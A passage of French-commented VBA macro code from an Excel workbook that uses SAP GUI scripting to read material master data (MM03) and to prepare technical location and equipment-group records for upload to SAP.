                    .Cells(Lign, 125).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP09/ssubTABFRA1:SAPLMGMM:2000/subSUB2:SAPLMGD1:2301/ctxtMARA-MATKL").Text
                    ' On valide la vue Planif. des besoins 1
                    GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP12").Select
                    ' On r|fffd|cup|fffd|re Type de planification
                    GuiSes.FindById("wnd[1]/tbar[0]/btn[0]").Press
                    .Cells(Lign, 99).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP12/ssubTABFRA1:SAPLMGMM:2000/subSUB3:SAPLMGD1:2482/ctxtMARC-DISMM").Text
                    ' On r|fffd|cup|fffd|re Point de commande = Stock mini
                    .Cells(Lign, 97).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP12/ssubTABFRA1:SAPLMGMM:2000/subSUB3:SAPLMGD1:2482/txtMARC-MINBE").Text
                    ' On revient au menu principal
                    GuiSes.FindById("wnd[0]/tbar[0]/btn[3]").Press
                    GuiSes.FindById("wnd[0]/tbar[0]/btn[3]").Press
                Else
                    GuiSes.FindById("wnd[1]/tbar[0]/btn[0]").Press
                    ' On r|fffd|cup|fffd|re Unit|fffd| de qt|fffd| base
                    .Cells(Lign, 126).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP09/ssubTABFRA1:SAPLMGMM:2000/subSUB2:SAPLMGD1:2301/ctxtMARA-MEINS").Text
                    ' On r|fffd|cup|fffd|re Groupe d'acheteurs
                    .Cells(Lign, 115).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP09/ssubTABFRA1:SAPLMGMM:2000/subSUB2:SAPLMGD1:2301/ctxtMARC-EKGRP").Text
                    ' On r|fffd|cup|fffd|re Statut art. par div.
                    .Cells(Lign, 124).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP09/ssubTABFRA1:SAPLMGMM:2000/subSUB2:SAPLMGD1:2301/ctxtMARC-MMSTA").Text
                    ' On r|fffd|cup|fffd|re Groupe marchandises
                    .Cells(Lign, 125).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP09/ssubTABFRA1:SAPLMGMM:2000/subSUB2:SAPLMGD1:2301/ctxtMARA-MATKL").Text
                    ' On valide la vue Planif. des besoins 1
                    GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP12").Select
                    ' On r|fffd|cup|fffd|re Type de planification
                    .Cells(Lign, 99).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP12/ssubTABFRA1:SAPLMGMM:2000/subSUB3:SAPLMGD1:2482/ctxtMARC-DISMM").Text
                    ' On r|fffd|cup|fffd|re Point de commande = Stock mini
                    .Cells(Lign, 97).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP12/ssubTABFRA1:SAPLMGMM:2000/subSUB3:SAPLMGD1:2482/txtMARC-MINBE").Text
                    ' On revient au menu principal
                    GuiSes.FindById("wnd[0]/tbar[0]/btn[3]").Press
                    GuiSes.FindById("wnd[0]/tbar[0]/btn[3]").Press
                End If
            End If
        End If
    End With
            
    Transaction_SAP_MM03 = True
    Exit Function
err_SAP:
    Transaction_SAP_MM03 = False
End Function



'
' L'objet de cette macro est de r|fffd|cup|fffd|rer toutes les informations relatives aux articles dont le code mabec est document dans l'onglet Liste PR
'
Public Sub R|fffd|cup|fffd|rer_Info_Article()
    Dim lLigne As Long, lDerniere_Ligne As Long
    Dim Onglet_Source As String, Onglet_Cible As String
    
    frmLoginSAP.Show
    If frmLoginSAP.bLogOk = False Then Exit Sub
    
    'On inhibe l'affichage
    GererConfiguration False
    Application.StatusBar = vbNullString
    
    With Worksheets(shPieces_Rechange)
        Application.StatusBar = "Purge des donn|fffd|es ant|fffd|rieures ..."
        ' suppression des donn|fffd|es pr|fffd|c|fffd|dentes
        .Range("AT6:DX65535").ClearContents
    
        ' On balaie toutes les donn|fffd|es de la feuille de donn|fffd|es Liste de FID
        lDerniere_Ligne = .Cells(65536, .Range("PrSacimMabec").Column).End(xlUp).row
        lLigne = 6
        Do
            If lLigne > lDerniere_Ligne Then
                Exit Do
            Else
                If .Cells(lLigne, .Range("PrSacimMabec").Column).Value <> vbNullString Then
                    If SAP_CV("MM03", shPieces_Rechange, lLigne, shPieces_Rechange) Then
                        ' Tout est OK
                    Else
                        ' Erreur dans le d|fffd|roulement de l'op|fffd|ration
                        MsgBox "Erreur dans le traitement |fffd| la ligne n|fffd|" & Ligne
                        Exit Do
                    End If
                End If
                lLigne = lLigne + 1
            End If
        Loop
    End With

    oBapiCtrl.Connection.Logoff
    Application.StatusBar = vbNullString
    GererConfiguration True
End Sub


Attribute VB_Name = "TDI_Macro_SIMPM"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   :
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 06/07/2005
'[Version       : V1.1 du 18/03/2009
'[---------------------------------------------------------------------------
'[Sujet:
'[---------------------------------------------------------------------------


' 09-11-2006 jm Reprise fonction recup num Sap

' JM 02/08/2007 : modif nombre de ligne Feuille Table Process 1500 au lieu de 1200
' JM 12-11-2007 : Reprise fonction recup Num SAP On travail avec la liste SMNTDI
' JM 14-12-2007 : Int|fffd|gration des num|fffd|ros de Licence

Dim Nom_macro As String

Dim DataWS As Worksheet

'Valeur
Const lg_pt = 30

Const col_div = 3
Const P_var_doc_ptlibel = 5

Dim fichier_travail As Variant
Dim var_libel_erreur As Variant
Dim Chemin As Variant
Dim var_etat As Variant

Dim prefixe As Variant
Dim nom_fic_txt As Variant
Dim libel_prefixe As Variant
'Dim var_type_equip As Variant
Dim var_groupe_autor As Variant
Dim Result As Variant
Dim var_ligne As Variant
Dim var_op As Variant
Dim var_desi As Variant
Dim Num_ligne As Variant

Dim var_metier As String
Dim var_div As String
Dim var_fp  As String
Dim var_efp As String
Dim var_sfp As String

Dim var_code_famille As Variant
Dim Var_qte As Variant
Dim mem_var_temp As String

Dim var_ilot As String
Dim var_zone As String
Dim var_repere_equip As String
Dim var_position As String
Dim var_numsap As Variant
Dim var_repere_comp As Variant
Dim var_niveau As Variant
Dim var_libel_fonct As Variant
Dim var_sufixe As Variant
Dim var_libel_four As Variant
Dim var_immo_princ As Variant
Dim var_immo_sec As Variant
Dim var_matricule As Variant
Dim var_categorie As Variant
Dim var_categorie_dequ As Variant
Dim var_sacim As Variant
Dim var_maintenir As String
Dim var_licence As String

Dim var_savdiv  As String
Dim var_savmetier  As String
Dim var_savligne  As String
Dim var_savefp  As String
Dim var_savfp  As String
Dim var_savsfp  As String
Dim var_savop  As String
Dim nb_NOK  As Integer
Dim var_ref_four As Variant
Dim var_nom_four As Variant
Dim var_ref_int As Variant
Dim var_nom_int As Variant
Dim var_num_serie As Variant
Dim mem_num_sap_ge As Variant

Dim fichierDonnees As Variant
'Const iDebut = 4
'iDebut
Dim iDonn|fffd|es
Dim iDebut
Dim iEcriture
Dim itraitement As Integer
Dim Arret_Traitement As Boolean
Dim Repertoire_Stockage As String
Dim var_precedent As String
Dim mem_pt_ge As String
Dim var_SavNumGe As Variant

Dim fileToOpen As String
Dim lg  As Integer
Dim Fin As Boolean
Dim cas_position As String


'****************************************
' oui = Modification du libell|fffd|
' non = pas de modif du libell|fffd|
' si pas de num|fffd|ro SAp g|fffd|n|fffd|rer le libell|fffd|
' modif le 15/10/2004 origine sandouville
'****************************************
Dim Mode_gen_lib_fonc As String


'Function Valeur_Cellule(Ligne, colonne As Integer) As String
'    'Valeur_Cellule = vba.ucase(ThisWorkbook.Sheets(shDecoupage).Cells(Ligne, colonne).Value)
'    'Modif ACH du 23/01/2008
'    Valeur_Cellule = VBA.UCase(VBA.Trim(ThisWorkbook.Sheets(shDecoupage).Cells(Ligne, colonne).Value))
'End Function



Function Lire_Valeur_Cellule(Ligne, Colonne As Integer, ByVal Onglet As String) As String
    Lire_Valeur_Cellule = VBA.UCase(VBA.Trim(ThisWorkbook.Sheets(Onglet).Cells(Ligne, Colonne).Value))
End Function

Sub Ecrire_Valeur_Cellule(Ligne, Colonne As Integer, Onglet, Valeur As String)
    ThisWorkbook.Sheets(Onglet).Cells(Ligne, Colonne).Value = Valeur
End Sub

Function TestBoiteActive(NomFenetre As String) As Boolean
    'teste si la bo|fffd|te de dialogue sp|fffd|cifi|fffd|e par son titre est toujours active
    On Error GoTo BoitePasActive
    AppActivate NomFenetre
    TestBoiteActive = True
    Exit Function
BoitePasActive:
    TestBoiteActive = False
    On Error GoTo 0
End Function

Function test_long(Longueur As Integer, chaine, Cas As String) As String
    If VBA.Len(chaine) > Longueur Then test_long = "(" + Cas + ")" Else test_long = vbNullString
End Function

Sub Lire_ligne(iLigne As Integer)
    Mode_gen_lib_fonc = Lire_Valeur_Cellule(33, 3, shCde_Simon)
    Num_ligne = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne - 1, shDecoupage)
    var_etat = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne, shDecoupage)
    var_div = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 1, shDecoupage)
    var_metier = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 2, shDecoupage)
    var_ligne = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 3, shDecoupage)
    var_efp = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 4, shDecoupage)
    var_fp = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 5, shDecoupage)
    var_sfp = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 6, shDecoupage)
    var_op = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 7, shDecoupage)
    var_desi = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 8, shDecoupage)
    var_ilot = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 9, shDecoupage)
    var_zone = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 10, shDecoupage)
    var_repere_equip = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 11, shDecoupage)
    var_repere_comp = var_ilot + var_zone + var_repere_equip
    var_niveau = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 15, shDecoupage)    '17
    var_numsap = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 16, shDecoupage)    '18
    var_categorie_dequ = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 18, shDecoupage) '20
    
    If var_categorie_dequ = "F" Then
'       var_categorie_dequ = "F"
    ElseIf var_categorie_dequ = "B" Then
'        var_categorie_dequ = "B"
    ElseIf var_categorie_dequ = "R" Then
'        var_categorie_dequ = "R"
    ElseIf var_categorie_dequ = "C" Then
'        var_categorie_dequ = "C"
    Else
        var_categorie_dequ = "F"
    End If
    var_ref_four = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 20, shDecoupage) ' 22
    var_sufixe = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 21, shDecoupage) ' 23
    var_nom_four = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 22, shDecoupage) '24
    var_libel_four = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 23, shDecoupage) '25
    var_ref_int = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 28, shDecoupage) '30
    var_nom_int = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 29, shDecoupage) '31
    var_num_serie = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 30, shDecoupage) '32
    Var_qte = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 31, shDecoupage) '33
    var_sacim = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 32, shDecoupage) '34
    var_maintenir = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 33, shDecoupage) '35
    var_licence = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 34, shDecoupage) '36
    var_code_famille = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 35, shDecoupage) '37
    ' Cas du code famille vide
    If VBA.Len(var_code_famille) < 3 Then var_code_famille = "ZZZBDN" Else var_code_famille = var_code_famille
    
    var_libel_fonct = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 37, shDecoupage) '39
    ' Cas du libell|fffd| vide
    If VBA.Len(var_libel_fonct) < 5 Then var_libel_fonct = var_libel_four + " " + var_repere_comp Else var_libel_fonct = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 37, shDecoupage)             '39
    var_immo_princ = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 24, shDecoupage)
    var_immo_sec = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 25, shDecoupage)
    var_matricule = Lire_Valeur_Cellule(iDonn|fffd|es, iLigne + 38, shDecoupage) '40
    ' Cas du matriculte vide non vide
    If VBA.Len(var_matricule) > 3 Then var_matricule = var_matricule Else If var_immo_sec = vbNullString Then var_matricule = var_immo_princ Else var_matricule = var_immo_princ + "_" + var_immo_sec
    cas_position = VBA.UCase(ThisWorkbook.Sheets(shCde_Simon).Cells(31, 8).Value)
    If cas_position = "OUI" Then var_position = VBA.Right(var_repere_comp, 4) Else var_position = vbNullString
End Sub

Sub PosteTechnique()
    'Traitement de la preparation des Postes techniques pour SAP
    Dim i               As Integer
    Dim var_pt As String, var_temp As String, var_ecriture As String, lg As String
    Dim var_doc_ptlibel As Variant
    Dim erreur          As Boolean
        
    erreur = False
    var_libel_erreur = vbNullString
    var_doc_ptlibel = "*******************************"
    i = col_div - 1
    Lire_ligne (i)
    
    If var_niveau <> "A" And var_etat <> "T" And var_etat <> "S" And var_etat <> "TS" Then
        'ligne poste technique sans equipement
        If var_niveau = vbNullString Then ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 17).Value = "PT"
        'Colonne Poste technique reconstitution de 7 colonnes en 1
        Result = vbNullString
        If var_div <> vbNullString Then Result = var_div
        If var_metier <> vbNullString Then Result = Result + "_" + var_metier
        If var_ligne <> vbNullString Then Result = Result + "_" + var_ligne
        If var_efp <> vbNullString And var_efp <> "---" Then Result = Result + "_" + var_efp Else var_efp = vbNullString
        If var_fp <> vbNullString And var_fp <> "----" Then Result = Result + "_" + var_fp Else var_fp = vbNullString
        If var_sfp <> vbNullString And var_sfp <> "----" Then Result = Result + "_" + var_sfp Else var_sfp = vbNullString
        If var_op <> vbNullString And var_op <> "----" Then Result = Result + "_" + var_op Else var_op = vbNullString
        var_pt = Result
  
        'si le PT lu est le meme on le saute et pas vide
        If var_pt <> var_precedent And var_pt <> vbNullString Then
            If var_savdiv <> var_div And var_div <> vbNullString Then
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 2).Value = var_div
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 4).Value = var_div
                var_ecriture = var_div
                
                'Recherche libell|fffd| DIVISION
                var_temp = Libelle_Code_Process("DIV", var_div, var_div)
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = var_temp
                
                If var_temp = vbNullString Then
                    ThisWorkbook.Sheets(shPt).Cells(iEcriture, 2).Value = var_div
                    ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = var_doc_ptlibel
                    erreur = True
                    var_libel_erreur = var_libel_erreur + "(2)"
                End If
                ' Division
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 2).Value = var_div
                If VBA.Len(var_div) <> 4 Then erreur = True: var_libel_erreur = var_libel_erreur + "(3)          "
                If erreur Then
                    var_libel_erreur = Libel_Nok & " " + var_libel_erreur + "*" + Num_ligne + "*"
                    ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = var_libel_erreur
                    nb_NOK = nb_NOK + 1
                Else
                    ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = Libel_Ok & " *" + Num_ligne + "*"
                End If
            End If
            ' langue
            lg = VBA.UCase(ThisWorkbook.Sheets(shCde_Simon).Cells(22, 16).Value)
            lg = VBA.Mid(lg, 1, 2)
            If lg = "FR" Then
            ElseIf lg = "ES" Then
            ElseIf lg = "GB" Then
            ElseIf lg = "SL" Then
            ElseIf lg = "PT" Then
            ElseIf lg = "RU" Then
            ElseIf lg = "RO" Then
            Else
                lg = "FR"
            End If
            var_savdiv = var_div
            var_temp = var_div
            'traitement m|fffd|tier
            
            If var_savmetier <> var_metier And var_metier <> vbNullString Then
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 2).Value = var_div
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 3).Value = lg
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 4).Value = var_div + "_" + var_metier
                var_ecriture = var_div + "_" + var_metier
               
                'Recherche libell|fffd| METIER
                var_temp = Libelle_Code_Process("MET", var_div, var_metier)

                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = var_temp
        
                If var_temp = vbNullString Then ThisWorkbook.Sheets(shPt).Cells(iEcriture, P_var_doc_ptlibel).Value = var_doc_ptlibel: erreur = True: var_libel_erreur = var_libel_erreur + "(1)"
                If VBA.Len(var_metier) <> 1 Then erreur = True: var_libel_erreur = var_libel_erreur + "(4)"
                If erreur Then var_libel_erreur = Libel_Nok + var_libel_erreur + "*" + Num_ligne + "*": ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = var_libel_erreur: nb_NOK = nb_NOK + 1 Else ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = Libel_Ok & " *" + Num_ligne + "*"
                erreur = False
                var_libel_erreur = vbNullString
                iEcriture = iEcriture + 1
            Else
            
            End If
            var_savmetier = var_metier
            var_temp = var_div + "_" + var_metier
             
            'traitement ligne
            If var_savligne <> var_ligne And var_ligne <> vbNullString Then
                'D|fffd|signation non Document|fffd|e, remplac|fffd|e par une s|fffd|rie d'|fffd|toiles
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 2).Value = var_div
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 3).Value = lg
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 4).Value = var_div + "_" + var_metier + "_" + var_ligne
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = var_doc_ptlibel
                var_ecriture = var_div + "_" + var_metier + "_" + var_ligne
                erreur = True
                var_libel_erreur = var_libel_erreur + "(1)"
                If VBA.Len(var_ligne) <> 3 Then var_libel_erreur = var_libel_erreur + "(5)"
                var_libel_erreur = Libel_Nok + var_libel_erreur + "*" + Num_ligne + "*"
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = var_libel_erreur
                nb_NOK = nb_NOK + 1
                iEcriture = iEcriture + 1
                ' modif 22
                var_savefp = vbNullString
                var_savfp = vbNullString
                var_savsfp = vbNullString
                var_savop = vbNullString
            End If
            erreur = False
            var_libel_erreur = vbNullString
            
            If var_savligne <> var_ligne Then var_savligne = var_ligne: mem_var_temp = vbNullString
            var_temp = var_div + "_" + var_metier + "_" + var_ligne
            If var_temp <> mem_var_temp Then var_savefp = vbNullString
            mem_var_temp = var_temp
            'traitement efp
             
            If var_savefp <> var_efp And var_efp <> vbNullString Then
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 2).Value = var_div
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 3).Value = lg
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 4).Value = var_div + "_" + var_metier + "_" + var_ligne + "_" + var_efp
                var_ecriture = var_div + "_" + var_metier + "_" + var_ligne + "_" + var_efp
               
                'Recherche libell|fffd| EFP
                var_temp = Libelle_Code_Process("EFP", var_div, var_efp)
        
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = var_temp
        
                If var_temp = vbNullString Then ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = var_doc_ptlibel: erreur = True: var_libel_erreur = var_libel_erreur + "(1)"
                If VBA.Len(var_efp) <> 3 Then erreur = True: var_libel_erreur = var_libel_erreur + "(5)"
                If erreur Then var_libel_erreur = Libel_Nok + var_libel_erreur + "*" + Num_ligne + "*": ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = var_libel_erreur: nb_NOK = nb_NOK + 1 Else ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = Libel_Ok & " *" + Num_ligne + "*"
                erreur = False
                var_libel_erreur = vbNullString
                iEcriture = iEcriture + 1
            End If
            var_savefp = var_efp
            var_temp = var_div + "_" + var_metier + "_" + var_ligne + "_" + var_efp
            
            'traitementFP
            If var_savfp <> var_fp And var_fp <> vbNullString Then
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 2).Value = var_div
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 3).Value = lg
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 4).Value = var_div + "_" + var_metier + "_" + var_ligne + "_" + var_efp + "_" + var_fp
                var_ecriture = var_div + "_" + var_metier + "_" + var_ligne + "_" + var_efp + "_" + var_fp
               
                'Recherche libell|fffd| FP
                var_temp = Libelle_Code_Process("FP", var_div, var_fp)
        
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = var_temp
        
                If var_temp = vbNullString Then ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = var_doc_ptlibel: erreur = True: var_libel_erreur = var_libel_erreur + "(1)"
                If VBA.Len(var_fp) <> 4 Then erreur = True: var_libel_erreur = var_libel_erreur + "(6)"
                If erreur Then var_libel_erreur = Libel_Nok + var_libel_erreur + "*" + Num_ligne + "*": ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = var_libel_erreur: nb_NOK = nb_NOK + 1 Else ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = Libel_Ok & " *" + Num_ligne + "*"
                erreur = False
                var_libel_erreur = vbNullString
                iEcriture = iEcriture + 1
            Else
            
            End If
            var_savfp = var_fp
            var_temp = var_div + "_" + var_metier + "_" + var_ligne + "_" + var_efp + "-" + var_fp
            
            'traitement SFP
            If var_savsfp <> var_sfp And var_sfp <> vbNullString Then
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 2).Value = var_div
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 3).Value = lg
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 4).Value = var_div + "_" + var_metier + "_" + var_ligne + "_" + var_efp + "_" + var_fp + "_" + var_sfp
                var_ecriture = var_div + "_" + var_metier + "_" + var_ligne + "_" + var_efp + "_" + var_fp + "_" + var_sfp
    
                'Recherche libell|fffd| SFP
                var_temp = Libelle_Code_Process("SFP", var_div, var_sfp)
    
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = var_temp
                
                If var_temp = vbNullString Then ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = var_doc_ptlibel: erreur = True: var_libel_erreur = var_libel_erreur + "(1)"
                If VBA.Len(var_sfp) <> 4 Then erreur = True: var_libel_erreur = var_libel_erreur + "(7)"
                If erreur Then var_libel_erreur = Libel_Nok + var_libel_erreur + "*" + Num_ligne + "*": ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = var_libel_erreur: nb_NOK = nb_NOK + 1 Else ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = Libel_Ok & " *" + Num_ligne + "*"
                erreur = False
                var_libel_erreur = vbNullString
                iEcriture = iEcriture + 1
            End If
                         
            var_savsfp = var_sfp
             
            If var_ecriture = var_pt Then iEcriture = iEcriture - 1
            ThisWorkbook.Sheets(shPt).Cells(iEcriture, 2).Value = var_div
            ThisWorkbook.Sheets(shPt).Cells(iEcriture, 3).Value = lg
            ThisWorkbook.Sheets(shPt).Cells(iEcriture, 4).Value = var_pt
            If var_desi > vbNullString Then
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = VBA.Mid(var_desi, 1, 40)
            ElseIf VBA.Trim(ThisWorkbook.Sheets("PT").Cells(iEcriture, 5).Value) = vbNullString Then
                ThisWorkbook.Sheets(shPt).Cells(iEcriture, 5).Value = VBA.Mid(ThisWorkbook.Sheets(shPt).Cells(iEcriture, 3).Value, 1, 40)
            End If
            If VBA.InStr(ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value, Libel_Nok) <> 0 Then nb_NOK = nb_NOK - 1
            ThisWorkbook.Sheets(shPt).Cells(iEcriture, 1).Value = Libel_Ok & " *" + Num_ligne + "*"
            iEcriture = iEcriture + 1
            var_precedent = var_pt
        End If
    End If
End Sub



Sub GE_creer()
    'Traitement de la preparation des Groupes d'Ensembles pour SAP
    Dim i As Integer, var_loc  As Integer
    Dim var_pt, lib_erreur As String, lg As String
    Dim var_temp As Variant
    Dim OK As Boolean, erreur As Boolean
    
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
    i = col_div - 1
    'test si la ligne est un GE sans numero SAP
    Result = Lire_Valeur_Cellule(iDonn|fffd|es, i + 15, shDecoupage)
    var_numsap = Lire_Valeur_Cellule(iDonn|fffd|es, i + 16, shDecoupage)
    If var_numsap = vbNullString Then OK = True Else If VBA.Len(var_numsap) > 7 Or Not Caracteres_Numeriques(var_numsap) Then OK = True Else OK = False
    If Result = "GE" And OK Then
        erreur = False
        lib_erreur = Libel_Nok & " "
        'reconstitution du poste technique
        var_pt = Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
        var_loc = i + 2
        Do
            Result = Lire_Valeur_Cellule(iDonn|fffd|es, var_loc, shDecoupage)
            If Result <> vbNullString And Result <> "---" And Result <> "----" Then var_pt = var_pt + "_" + Result
            var_loc = var_loc + 1
        Loop Until var_loc > i + 7
        Result = var_pt
        Lire_ligne (i)
        
        If var_ref_four = vbNullString Then var_ref_four = "*****"
        If var_sufixe <> vbNullString Then var_ref_four = var_ref_four + "_" + var_sufixe
        If var_nom_four = vbNullString Then var_nom_four = "****"
        
        'ecriture fichier
        If var_etat <> "T" And var_etat <> "S" And var_etat <> "TS" Then
            var_libel_erreur = vbNullString
            i = 2
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, 1).Value = Num_ligne
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 1).Value = var_div ' 1 division
            ' 2 langue
            lg = VBA.UCase(ThisWorkbook.Sheets(shCde_Simon).Cells(22, 16).Value)
            lg = VBA.Mid(lg, 1, 2)
            Select Case lg
                Case "FR", "ES", "GB", "SL", "PT", "RU", "RO"

                Case Else
                    lg = "FR"
            End Select
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 2).Value = lg
            ' 3 num Sap
            
            ' 4 Num licence
            
            ' 5 Point de pose sur Poste technique
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 5).Value = var_pt
            If VBA.Len(var_pt) > lg_pt Then var_libel_erreur = var_libel_erreur + "(5)"
            ' 6 PP-EQUIP
            ' 7 PP-Licence
            ' 8 Enlever Ref four
            ' 9 Enlever statut Ref
            '10 Num position 'N|fffd| Position(4)
            var_libel_erreur = var_libel_erreur + test_long(4, var_position, "7")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 10).Value = var_position
            '11 Groupe Autorisation
            '12 Cat|fffd|gorie d'|fffd|quipement
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 12).Value = "N"
            '13 Libelle fonctionnel de l'|fffd|quipement obl(40)
            If var_libel_fonct = vbNullString Then var_libel_erreur = var_libel_erreur + "(2)"
            var_libel_erreur = var_libel_erreur + test_long(40, var_libel_fonct, "10")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 13).Value = var_libel_fonct
            '14 Num s|fffd|rie Fabricant (30)
            var_libel_erreur = var_libel_erreur + test_long(30, var_num_serie, "11")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 14).Value = var_num_serie
            '15 Type equipement
            '16 Num inventaire (25)
            var_libel_erreur = var_libel_erreur + test_long(25, var_matricule, "13")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 16).Value = var_matricule
            '17 code ABC
            '18 Localisation
            '19 Local
            '20 Centre de cout
            '21 Immobilisation principale (12)
            var_libel_erreur = var_libel_erreur + test_long(12, var_immo_princ, "15")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 21).Value = var_immo_princ
            '22 Immobilisation subsidiaire(4)
            var_libel_erreur = var_libel_erreur + test_long(4, var_immo_sec, "16")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 22).Value = var_immo_sec
            '23 Valeur d'acquisition
            '24 Devise d'acquisition
            '25 Date c'acquisition
            '26 Date de D|fffd|but de garantie fournisseur
            '27 Date de fin de garantir fournisseur
            '28 Repere   (30)
            var_libel_erreur = var_libel_erreur + test_long(30, var_repere_comp, "17")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 28).Value = var_repere_comp
            
            '29 Num licence 20)
            prefixe = libel_prefixe + Num_ligne
            var_libel_erreur = var_libel_erreur + test_long(20, prefixe, "18")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 29).Value = prefixe
            ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 18).Value = prefixe
            '30 Code Mabec
            var_libel_erreur = var_libel_erreur + test_long(20, var_sacim, "26")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 30).Value = var_sacim
            '31 Libelle Mat|fffd|riel de l'|fffd|quipement obl(30)
            If var_libel_four = vbNullString Then var_libel_erreur = var_libel_erreur + "(4)"
            var_libel_erreur = var_libel_erreur + test_long(30, var_libel_four, "19")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 31).Value = var_libel_four
